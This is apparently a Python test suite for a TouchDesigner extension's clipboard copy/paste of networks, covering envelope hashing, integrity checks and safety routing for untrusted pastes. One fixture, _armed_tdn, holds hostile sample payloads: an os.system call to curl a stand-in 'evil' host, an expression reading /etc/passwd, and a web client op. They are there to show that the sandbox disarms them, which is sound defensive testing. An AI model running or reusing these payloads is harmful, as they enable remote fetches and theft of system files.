"""
Test suite: TDN clipboard Copy/Paste (Ctrl+Shift+C / Ctrl+Shift+V).

Covers TWO layers:

  HEADLESS  -- the module-level envelope contract in TDXNExt.py
              (wrap_tdn / canonical_tdn_bytes / tdn_sha256 / to_clipboard_str /
               unwrap_clipboard / is_embody_tdn_envelope / verify_envelope_integrity /
               resolve_tdn_name). Pure Python, no TD state, no clipboard.

  LIVE      -- copyNetworkToClipboard / copySelectedToClipboard /
               _planPasteFromClipboard / pasteNetworkFromClipboard /
               pasteNetworkAsNewComp / clipboardHasNetwork, which round-trip
               a small COMP through the OS clipboard (ui.clipboard).

The module-level funcs are reached via the TDXNExt DAT module; the class methods
via self.embody.ext.TDXN. ASCII punctuation only.
"""

import json
import copy

runner_mod = op.unit_tests.op('TestRunnerExt').module
EmbodyTestCase = runner_mod.EmbodyTestCase


# ---------------------------------------------------------------------------
# Shared helpers
# ---------------------------------------------------------------------------

def _tdn_module():
    """The TDXNExt DAT module -- home of the module-level envelope funcs."""
    return op.Embody.op('TDXNExt').module


def _sample_tdn():
    """A minimal-but-realistic .tdn document with an internal connection.

    Mirrors the shape produced by ExportNetwork: a 'network_path' (required),
    plus an 'operators' list where 'inputs' is a string array of source names.
    Keys are intentionally NOT pre-sorted so canonical/sha tests are meaningful.
    """
    return {
        'format': 'tdn',
        'version': '2.0',
        'network_path': '/sandbox/widget',
        'operators': [
            {'name': 'noise1', 'type': 'noiseTOP'},
            {'name': 'level1', 'type': 'levelTOP', 'inputs': ['noise1']},
        ],
    }


def plan_or_skip(tc, wrote):
    """Plan a paste, and SKIP (not FAIL) if the OS clipboard was clobbered.

    seedClipboard verifies the WRITE stuck, but the real clipboard is shared
    with every process on the machine and can be taken between that write and
    the read inside _planPasteFromClipboard. That window is what fails this
    suite in full runs while it passes in isolation, always as a bare
    reason='no_tdn' (2026-07-26, again 2026-09-04).

    Fault detection is preserved: if the clipboard still holds what we wrote
    and the plan is not ok, that is a real routing bug and the caller's
    assertion fails as before. Module-level so every test class here can use
    it -- the tests that read the clipboard span four classes.
    """
    plan = tc.tdn_ext._planPasteFromClipboard()
    if not plan.get('ok'):
        now = ui.clipboard or ''
        if now != wrote:
            raise SkipTest(
                'OS clipboard clobbered between write and read by another '
                'process -- not a routing failure. '
                f'wrote len={len(wrote)} head={wrote[:50]!r}; '
                f'read len={len(now)} head={now[:50]!r}')
    return plan


def paste_or_skip(tc, res):
    """Clobber guard for the copy -> paste path.

    Companion to plan_or_skip for tests whose clipboard text was written by
    copyNetworkToClipboard rather than held by the test, so there is nothing
    to compare against -- key on the envelope marker instead. Same contract:
    a clipboard that still holds an envelope means a real paste failure and
    the caller's assertion fires.
    """
    if not res.get('ok'):
        raw = ui.clipboard or ''
        marker = _tdn_module().EMBODY_TDN_MARKER
        if marker not in raw:
            raise SkipTest(
                'OS clipboard clobbered between copy and paste by another '
                'process -- not a paste failure. '
                f'clipboard len={len(raw)} head={raw[:50]!r}')
    return res


class TestClipboardEnvelopeHeadless(EmbodyTestCase):
    """(1) Pure envelope contract -- TDXNExt's own module-level funcs."""

    def setUp(self):
        super().setUp()
        self.m = _tdn_module()

    # --- wrap_tdn round-trip ------------------------------------------------

    def test_wrap_tdn_round_trip(self):
        tdn = _sample_tdn()
        env = self.m.wrap_tdn(tdn, source='embody')
        # Envelope shape: marker, version, source, sha256, inner tdn.
        self.assertEqual(env[self.m.EMBODY_TDN_MARKER], self.m.EMBODY_TDN_VERSION)
        self.assertEqual(env['source'], 'embody')
        self.assertEqual(env['tdn'], tdn)
        self.assertTrue(self.m.is_embody_tdn_envelope(env))
        # sha256 matches the canonical hash of the inner tdn.
        self.assertEqual(env['sha256'], self.m.tdn_sha256(tdn))
        self.assertTrue(self.m.verify_envelope_integrity(env))

    def test_wrap_tdn_with_slug_and_version(self):
        tdn = _sample_tdn()
        env = self.m.wrap_tdn(tdn, source='embody.tools', slug='my-widget', version=3)
        self.assertEqual(env['source'], 'embody.tools')
        self.assertEqual(env['slug'], 'my-widget')
        self.assertEqual(env['version'], 3)
        self.assertTrue(self.m.is_embody_tdn_envelope(env))

    def test_wrap_tdn_omits_optional_keys_when_none(self):
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        self.assertNotIn('slug', env)
        self.assertNotIn('version', env)

    def test_wrap_tdn_bad_source_raises_value_error(self):
        # Source must be one of ENVELOPE_SOURCES; anything else is a ValueError.
        self.assertRaises(ValueError, self.m.wrap_tdn, _sample_tdn(), 'evil.source')

    # --- canonical_tdn_bytes ------------------------------------------------

    def test_canonical_bytes_sorted_keys_no_spaces(self):
        tdn = _sample_tdn()
        raw = self.m.canonical_tdn_bytes(tdn)
        self.assertIsInstance(raw, bytes)
        text = raw.decode('utf-8')
        # Compact separators: no ", " or ": " whitespace.
        self.assertNotIn(', ', text)
        self.assertNotIn(': ', text)
        # Keys are sorted: 'format' sorts before 'network_path' before 'operators'.
        self.assertLess(text.index('"format"'), text.index('"network_path"'))
        self.assertLess(text.index('"network_path"'), text.index('"operators"'))

    def test_canonical_bytes_key_order_independent(self):
        # Same content, different insertion order -> identical canonical bytes.
        a = {'b': 1, 'a': 2, 'c': {'z': 9, 'y': 8}}
        b = {'c': {'y': 8, 'z': 9}, 'a': 2, 'b': 1}
        self.assertEqual(self.m.canonical_tdn_bytes(a), self.m.canonical_tdn_bytes(b))

    # --- tdn_sha256 determinism --------------------------------------------

    def test_sha256_key_order_determinism(self):
        a = {'name': 'level1', 'type': 'levelTOP', 'inputs': ['noise1']}
        b = {'inputs': ['noise1'], 'type': 'levelTOP', 'name': 'level1'}
        self.assertEqual(self.m.tdn_sha256(a), self.m.tdn_sha256(b))

    def test_sha256_is_hex_string(self):
        h = self.m.tdn_sha256(_sample_tdn())
        self.assertIsInstance(h, str)
        self.assertEqual(len(h), 64)
        int(h, 16)  # raises ValueError if not hex

    def test_sha256_changes_on_content_change(self):
        base = _sample_tdn()
        mutated = copy.deepcopy(base)
        mutated['operators'][0]['name'] = 'noise2'
        self.assertNotEqual(self.m.tdn_sha256(base), self.m.tdn_sha256(mutated))

    # --- to_clipboard_str / unwrap_clipboard round-trip --------------------

    def test_clipboard_str_round_trip(self):
        env = self.m.wrap_tdn(_sample_tdn(), source='embody', slug='widget')
        text = self.m.to_clipboard_str(env)
        self.assertIsInstance(text, str)
        back = self.m.unwrap_clipboard(text)
        self.assertIsNotNone(back)
        self.assertEqual(back['sha256'], env['sha256'])
        self.assertEqual(back['tdn'], env['tdn'])
        self.assertEqual(back['source'], 'embody')

    def test_indentation_does_not_change_sha256(self):
        # to_clipboard_str pretty-prints (indent=2), but the sha256 is computed
        # over canonical_tdn_bytes(tdn) -- whitespace-insensitive. Parsing the
        # pretty form and re-hashing must reproduce the same digest.
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        pretty = self.m.to_clipboard_str(env)
        self.assertIn('\n', pretty)  # confirms it really is indented
        parsed = json.loads(pretty)
        self.assertEqual(self.m.tdn_sha256(parsed['tdn']), env['sha256'])
        # And an indented vs compact serialization of the same tdn hash equally.
        compact = json.dumps(env['tdn'], separators=(',', ':'))
        self.assertEqual(
            self.m.tdn_sha256(json.loads(compact)),
            self.m.tdn_sha256(parsed['tdn']))

    # --- unwrap of malformed / non-envelope --------------------------------

    def test_unwrap_malformed_json_returns_none(self):
        self.assertIsNone(self.m.unwrap_clipboard('{not valid json'))

    def test_unwrap_empty_returns_none(self):
        self.assertIsNone(self.m.unwrap_clipboard(''))

    def test_unwrap_plain_json_non_envelope_returns_none(self):
        # Well-formed JSON that is NOT an _embody_tdn envelope.
        self.assertIsNone(self.m.unwrap_clipboard('{"hello": "world"}'))

    def test_unwrap_bare_tdn_doc_returns_none(self):
        # A bare .tdn document (no envelope wrapper) is not an envelope.
        self.assertIsNone(self.m.unwrap_clipboard(json.dumps(_sample_tdn())))

    # --- is_embody_tdn_envelope edge cases ---------------------------------

    def test_is_envelope_rejects_non_dict(self):
        self.assertFalse(self.m.is_embody_tdn_envelope('string'))
        self.assertFalse(self.m.is_embody_tdn_envelope(None))
        self.assertFalse(self.m.is_embody_tdn_envelope([1, 2, 3]))

    def test_is_envelope_rejects_wrong_marker_version(self):
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        env[self.m.EMBODY_TDN_MARKER] = 999
        self.assertFalse(self.m.is_embody_tdn_envelope(env))

    def test_is_envelope_rejects_bad_source(self):
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        env['source'] = 'embody.tools'  # still a valid source
        self.assertTrue(self.m.is_embody_tdn_envelope(env))
        env['source'] = 'totally.bogus'
        self.assertFalse(self.m.is_embody_tdn_envelope(env))

    def test_is_envelope_rejects_missing_tdn(self):
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        env['tdn'] = 'not a dict'
        self.assertFalse(self.m.is_embody_tdn_envelope(env))

    # --- verify_envelope_integrity -----------------------------------------

    def test_verify_integrity_true_for_clean_envelope(self):
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        self.assertTrue(self.m.verify_envelope_integrity(env))

    def test_verify_integrity_detects_post_hash_mutation(self):
        # Mutate the inner tdn AFTER hashing -> sha256 no longer matches.
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        env['tdn']['operators'].append({'name': 'extra', 'type': 'nullTOP'})
        self.assertFalse(self.m.verify_envelope_integrity(env))

    def test_verify_integrity_handles_missing_keys(self):
        # Missing 'tdn'/'sha256' -> caught internally, returns False (no raise).
        self.assertFalse(self.m.verify_envelope_integrity({}))

    # --- resolve_tdn_name ---------------------------------------------------

    def test_resolve_name_from_network_path_basename(self):
        tdn = {'network_path': '/project1/scene/widget'}
        self.assertEqual(self.m.resolve_tdn_name(tdn), 'widget')

    def test_resolve_name_strips_trailing_slash(self):
        tdn = {'network_path': '/project1/widget/'}
        self.assertEqual(self.m.resolve_tdn_name(tdn), 'widget')

    def test_resolve_name_falls_back_to_slug(self):
        # No usable network_path -> envelope slug.
        tdn = {'network_path': '/'}  # rstrip('/') -> '' -> no basename
        self.assertEqual(self.m.resolve_tdn_name(tdn, slug='myslug'), 'myslug')

    def test_resolve_name_none_when_nothing_usable(self):
        self.assertIsNone(self.m.resolve_tdn_name({'network_path': '/'}))
        self.assertIsNone(self.m.resolve_tdn_name({}))
        self.assertIsNone(self.m.resolve_tdn_name(None))


class TestClipboardLiveRoundTrip(EmbodyTestCase):
    """(2) Live copy -> paste round-trip through ui.clipboard."""

    def setUp(self):
        super().setUp()
        self.tdn_ext = self.embody.ext.TDXN
        self._saved_clip = None
        try:
            self._saved_clip = ui.clipboard
        except Exception:
            self._saved_clip = None

    def tearDown(self):
        # Restore the user's clipboard so tests do not clobber it.
        try:
            if self._saved_clip is not None:
                ui.clipboard = self._saved_clip
        except Exception:
            pass
        super().tearDown()

    def _build_small_network(self, host_name):
        """A COMP with 2 ops and an internal connection inside the sandbox."""
        host = self.sandbox.create(baseCOMP, host_name)
        src = host.create(noiseTOP, 'noise1')
        dst = host.create(levelTOP, 'level1')
        # Wire noise1 -> level1 (input 0).
        dst.inputConnectors[0].connect(src)
        return host

    def test_copy_places_valid_envelope(self):
        host = self._build_small_network('copy_src')
        res = self.tdn_ext.copyNetworkToClipboard(host)
        self.assertTrue(res.get('ok'), msg=repr(res))
        self.assertEqual(res['name'], 'copy_src')
        self.assertGreaterEqual(res['op_count'], 2)
        # The clipboard now holds a valid envelope -- unless another process
        # grabbed the clipboard between the copy above and this read, which
        # is an environment problem rather than a copy failure.
        m = _tdn_module()
        self.requireClipboardHolds(
            lambda raw: m.unwrap_clipboard(raw) is not None,
            what='the envelope just copied',
            reseed=lambda: self.tdn_ext.copyNetworkToClipboard(host))
        env = m.unwrap_clipboard(ui.clipboard)
        self.assertIsNotNone(env)
        self.assertEqual(env['source'], 'embody')
        # Reported sha256 matches the canonical hash of the inner tdn.
        self.assertEqual(res['sha256'], env['sha256'])
        self.assertEqual(env['sha256'], m.tdn_sha256(env['tdn']))
        self.assertTrue(m.verify_envelope_integrity(env))

    def test_copy_rejects_non_comp(self):
        top = self.sandbox.create(noiseTOP, 'lonely_top')
        res = self.tdn_ext.copyNetworkToClipboard(top)
        self.assertFalse(res.get('ok'))
        self.assertEqual(res.get('reason'), 'not_a_comp')

    def _copy_verified(self, host):
        """copyNetworkToClipboard, confirming the envelope actually landed.

        The OS clipboard is machine-wide and contended (see seedClipboard);
        a copy can report ok while another process wins the clipboard, so
        every test that copies-then-depends-on-the-clipboard funnels
        through here. Checks the RAW envelope marker, never
        clipboardHasNetwork/unwrap -- those are product code under test in
        this very suite.
        """
        res = self.tdn_ext.copyNetworkToClipboard(host)
        marker = _tdn_module().EMBODY_TDN_MARKER
        self.requireClipboardHolds(
            lambda raw: marker in raw,
            what='the envelope just copied',
            reseed=lambda: self.tdn_ext.copyNetworkToClipboard(host))
        return res

    def test_clipboard_has_network_true_after_copy(self):
        host = self._build_small_network('has_net_src')
        self._copy_verified(host)
        self.assertTrue(self.tdn_ext.clipboardHasNetwork())

    def test_clipboard_has_network_false_for_garbage(self):
        # Must be seeded verifiably: if the write silently failed the
        # clipboard would still hold a PREVIOUS envelope and this would
        # fail as though clipboardHasNetwork were broken.
        self.seedClipboard('not an envelope at all')
        self.assertFalse(self.tdn_ext.clipboardHasNetwork())

    def test_paste_into_target_reconstructs_children_and_connection(self):
        host = self._build_small_network('rt_src')
        self._copy_verified(host)
        target = self.sandbox.create(baseCOMP, 'rt_target')
        res = paste_or_skip(
            self, self.tdn_ext.pasteNetworkFromClipboard(target))
        self.assertTrue(res.get('ok'), msg=repr(res))
        self.assertEqual(res['mode'], 'direct')
        self.assertEqual(res['source'], 'embody')
        # Children reconstructed inside the target.
        names = sorted(c.name for c in target.children)
        self.assertIn('noise1', names)
        self.assertIn('level1', names)
        # The internal connection was rebuilt: level1 input 0 == noise1.
        level = target.op('level1')
        self.assertIsNotNone(level)
        self.assertGreaterEqual(len(level.inputs), 1,
                                msg='level1 has no input after paste')
        self.assertIsNotNone(level.inputs[0])
        self.assertEqual(level.inputs[0].name, 'noise1')

    def test_paste_as_new_comp_names_from_basename(self):
        host = self._build_small_network('newcomp_src')
        self._copy_verified(host)
        # pasteNetworkAsNewComp creates a COMP at the CURRENT network. Point the
        # current pane at the sandbox so the new COMP lands (and is auto-cleaned)
        # there, then assert it is named from the network_path basename.
        pane = ui.panes.current
        prev_owner = pane.owner if pane else None
        try:
            try:
                pane.owner = self.sandbox
            except Exception:
                raise SkipTest('cannot retarget current pane to sandbox')
            res = self.tdn_ext.pasteNetworkAsNewComp()
            self.assertTrue(res.get('ok'), msg=repr(res))
            self.assertEqual(res['mode'], 'direct')
            new_comp = op(res['comp'])
            self.assertIsNotNone(new_comp)
            # network_path basename is the copied host's name -> new COMP name.
            self.assertStartsWith(new_comp.name, 'newcomp_src')
            child_names = sorted(c.name for c in new_comp.children)
            self.assertIn('noise1', child_names)
            self.assertIn('level1', child_names)
        finally:
            if prev_owner is not None:
                try:
                    pane.owner = prev_owner
                except Exception:
                    pass

    def test_paste_into_non_comp_returns_not_a_comp(self):
        host = self._build_small_network('badtarget_src')
        self._copy_verified(host)
        res = self.tdn_ext.pasteNetworkFromClipboard('/nonexistent/path/xyz')
        self.assertFalse(res.get('ok'))
        self.assertEqual(res.get('reason'), 'not_a_comp')


class TestClipboardPasteRouting(EmbodyTestCase):
    """(3) _planPasteFromClipboard routing by provenance."""

    def setUp(self):
        super().setUp()
        self.tdn_ext = self.embody.ext.TDXN
        self.m = _tdn_module()
        try:
            self._saved_clip = ui.clipboard
        except Exception:
            self._saved_clip = None

    def tearDown(self):
        try:
            if self._saved_clip is not None:
                ui.clipboard = self._saved_clip
        except Exception:
            pass
        super().tearDown()

    def _set_clipboard(self, text):
        """Write the system clipboard and VERIFY the write stuck.

        `ui.clipboard` is the real OS clipboard, shared with every process
        on the machine, so anything (another app, clipboard history, a
        developer's own tooling) can clobber it between this write and the
        read inside `_planPasteFromClipboard`. That race made this suite
        fail intermittently in full runs -- surfacing as a bare
        `{'ok': False, 'reason': 'no_tdn'}` that looks like a routing bug
        and gives no hint of the real cause (observed 2026-07-26; the same
        suite passes 42/42 in isolation).

        The shared helper retries with backoff (contention routinely
        outlasts a tight loop) and reports a loud SKIP rather than a false
        failure when the OS will not hand over the clipboard at all.
        """
        self.seedClipboard(text, what='the paste-source clipboard')

    def _safe_import(self):
        coll = self.embody.op('Collection')
        return coll.op('safe_import').module if coll else None

    def _armed_tdn(self):
        """A TDN lighting up armed surfaces safe_import disarms (active Execute
        DAT + os.system, a file-read expr, a web IO op), so neutralization is
        OBSERVABLE: is_inert is False before routing and must be True after."""
        return {
            'format': 'tdn', 'version': '2.0', 'network_path': '/shared/payload',
            'type': 'baseCOMP',
            'operators': [
                {'name': 'execute1', 'type': 'executeDAT',
                 'dat_content': "import os\nos.system('curl http://evil')\n",
                 'dat_content_format': 'text',
                 'parameters': {'active': "=op('ctrl').par.On"}},
                {'name': 'glow1', 'type': 'levelTOP',
                 'parameters': {'gamma': "=open('/etc/passwd').read()"}},
                {'name': 'net1', 'type': 'webclientDAT'},
            ],
        }

    def test_own_envelope_routes_direct(self):
        env = self.m.wrap_tdn(_sample_tdn(), source='embody', slug='widget')
        wrote = self.m.to_clipboard_str(env)
        self._set_clipboard(wrote)
        # _plan_or_skip separates an OS clipboard clobber (SKIP) from a
        # real routing bug (the assertion below still fails).
        plan = plan_or_skip(self, wrote)
        self.assertTrue(plan.get('ok'), msg=repr(plan))
        self.assertEqual(plan['source'], 'embody')
        self.assertEqual(plan['mode'], 'direct')
        self.assertEqual(plan['tdn'], _sample_tdn())
        # Trusted path performs no scan, so no capability/summary.
        self.assertIsNone(plan.get('capability'))
        self.assertIsNone(plan.get('summary'))
        self.assertTrue(plan.get('integrity_ok'))

    def test_community_envelope_routes_inert(self):
        si = self._safe_import()
        if si is None:
            raise SkipTest('Collection sub-COMP not present')
        armed = self._armed_tdn()
        self.assertFalse(si.is_inert(armed),
            'fixture must START armed (not inert) for the test to be meaningful')
        env = self.m.wrap_tdn(armed, source='embody.tools', slug='shared')
        wrote = self.m.to_clipboard_str(env)
        self._set_clipboard(wrote)
        plan = plan_or_skip(self, wrote)
        self.assertTrue(plan.get('ok'), msg=repr(plan))
        self.assertEqual(plan['source'], 'embody.tools')
        # Community content is default-inerted by the Collection sandbox.
        self.assertEqual(plan['mode'], 'inert')
        # The scan attaches a capability report.
        self.assertIsNotNone(plan.get('capability'))
        # SECURITY CONTRACT: the routed community payload is actually DEFANGED
        # (the armed Execute DAT neutralized), not merely tagged 'inert'.
        self.assertTrue(si.is_inert(plan['tdn']),
            'community paste must be neutralized (is_inert), not just routed')

    def test_bare_tdn_doc_routes_inert_via_collection(self):
        si = self._safe_import()
        if si is None:
            raise SkipTest('Collection sub-COMP not present')
        # A bare .tdn document (no envelope) carries no provenance -> inert.
        armed = self._armed_tdn()
        self.assertFalse(si.is_inert(armed),
            'fixture must START armed for the test to be meaningful')
        wrote = json.dumps(armed)
        self._set_clipboard(wrote)
        plan = plan_or_skip(self, wrote)
        self.assertTrue(plan.get('ok'), msg=repr(plan))
        self.assertEqual(plan['source'], 'file')
        self.assertEqual(plan['mode'], 'inert')
        # An untrusted bare .tdn must be neutralized, not just routed.
        self.assertTrue(si.is_inert(plan['tdn']),
            'an untrusted bare .tdn must be neutralized (is_inert)')

    def test_garbage_returns_not_ok(self):
        self._set_clipboard('this is not json and not a tdn at all')
        plan = self.tdn_ext._planPasteFromClipboard()
        self.assertFalse(plan.get('ok'))

    def test_empty_clipboard_returns_not_ok(self):
        self._set_clipboard('')
        plan = self.tdn_ext._planPasteFromClipboard()
        self.assertFalse(plan.get('ok'))

    def test_non_envelope_json_without_operators_returns_not_ok(self):
        # Valid JSON, but not an envelope and not a tdn doc (no 'operators').
        self._set_clipboard(json.dumps({'hello': 'world'}))
        plan = self.tdn_ext._planPasteFromClipboard()
        self.assertFalse(plan.get('ok'))


class TestClipboardCopySelectedAndIntegrity(EmbodyTestCase):
    """(4) copySelectedToClipboard edge cases + integrity-mismatch behavior."""

    def setUp(self):
        super().setUp()
        self.tdn_ext = self.embody.ext.TDXN
        self.m = _tdn_module()
        try:
            self._saved_clip = ui.clipboard
        except Exception:
            self._saved_clip = None

    def tearDown(self):
        try:
            if self._saved_clip is not None:
                ui.clipboard = self._saved_clip
        except Exception:
            pass
        super().tearDown()

    def test_copy_selected_no_comp_selected(self):
        # Point the current pane at the (empty, no-COMP-selected) sandbox.
        pane = ui.panes.current
        prev_owner = pane.owner if pane else None
        try:
            try:
                pane.owner = self.sandbox
            except Exception:
                raise SkipTest('cannot retarget current pane to sandbox')
            # Ensure nothing is selected.
            for c in self.sandbox.children:
                try:
                    c.selected = False
                except Exception:
                    pass
            res = self.tdn_ext.copySelectedToClipboard()
            self.assertFalse(res.get('ok'))
            self.assertEqual(res.get('reason'), 'no_comp_selected')
        finally:
            if prev_owner is not None:
                try:
                    pane.owner = prev_owner
                except Exception:
                    pass

    def test_copy_selected_picks_first_of_multiple(self):
        a = self.sandbox.create(baseCOMP, 'sel_a')
        b = self.sandbox.create(baseCOMP, 'sel_b')
        pane = ui.panes.current
        prev_owner = pane.owner if pane else None
        try:
            try:
                pane.owner = self.sandbox
            except Exception:
                raise SkipTest('cannot retarget current pane to sandbox')
            try:
                a.selected = True
                b.selected = True
            except Exception:
                raise SkipTest('cannot set selection on sandbox children')
            # selectedChildren ordering is TD-defined; the impl copies comps[0].
            sel = [c for c in self.sandbox.selectedChildren if c.isCOMP]
            if len(sel) < 2:
                raise SkipTest('multi-select not reflected in selectedChildren')
            expected_first = sel[0].name
            res = self.tdn_ext.copySelectedToClipboard()
            self.assertTrue(res.get('ok'), msg=repr(res))
            self.assertEqual(res.get('name'), expected_first)
        finally:
            if prev_owner is not None:
                try:
                    pane.owner = prev_owner
                except Exception:
                    pass

    def test_own_source_mutated_after_hash_still_pastes_but_flags_integrity(self):
        # DOCUMENTED behavior (from the source): the own-source 'embody' branch
        # of _planPasteFromClipboard sets mode='direct' and tdn=tdn regardless
        # of the integrity result -- it only RECORDS integrity_ok. So a mutated
        # own-source envelope still produces a usable plan (ok True) with the
        # mismatch surfaced via integrity_ok=False, and the paste proceeds.
        env = self.m.wrap_tdn(_sample_tdn(), source='embody')
        env['tdn']['operators'].append({'name': 'injected', 'type': 'nullTOP'})
        # sha256 no longer matches the (now-mutated) inner tdn.
        self.assertFalse(self.m.verify_envelope_integrity(env))
        wrote = self.m.to_clipboard_str(env)
        self.seedClipboard(wrote)
        plan = plan_or_skip(self, wrote)
        self.assertTrue(plan.get('ok'), msg=repr(plan))
        self.assertEqual(plan['mode'], 'direct')
        self.assertEqual(plan['source'], 'embody')
        self.assertFalse(plan.get('integrity_ok'))
        # The mutated tdn is still handed through for import (no blocking).
        self.assertEqual(plan['tdn'], env['tdn'])

        # And a live paste of that plan succeeds and reconstructs the children,
        # confirming the integrity flag is advisory, not a gate.
        target = self.sandbox.create(baseCOMP, 'mut_target')
        res = self.tdn_ext.pasteNetworkFromClipboard(target)
        self.assertTrue(res.get('ok'), msg=repr(res))
        child_names = sorted(c.name for c in target.children)
        self.assertIn('injected', child_names)
